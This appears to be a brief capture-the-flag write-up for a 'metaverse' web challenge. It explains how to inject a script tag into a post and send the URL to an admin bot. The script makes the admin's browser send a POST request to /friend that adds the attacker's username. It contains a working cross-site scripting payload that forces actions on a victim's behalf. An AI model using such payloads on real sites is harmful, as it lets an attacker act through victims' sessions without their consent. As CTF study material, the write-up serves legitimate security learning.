Just make admin to add my account to friend list
Find js function friend() and add it ti script tag, make post and send url to admin bot

<script>
fetch("https://metaverse.lac.tf/friend", {
                    method: "POST",
                    body: "username=<your username>",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                }).then((res) =>
                    res.text().then((t) => {
                        if (res.status !== 200) {
                            document.querySelector(".error")?.remove();
                            const error = document.createElement("p");
                            error.innerText = t;
                            error.classList.add("error");
                            document.body.insertAdjacentElement("afterbegin", error);
                        } else {
                            location.reload();
                        }
                    })
                );
</script>
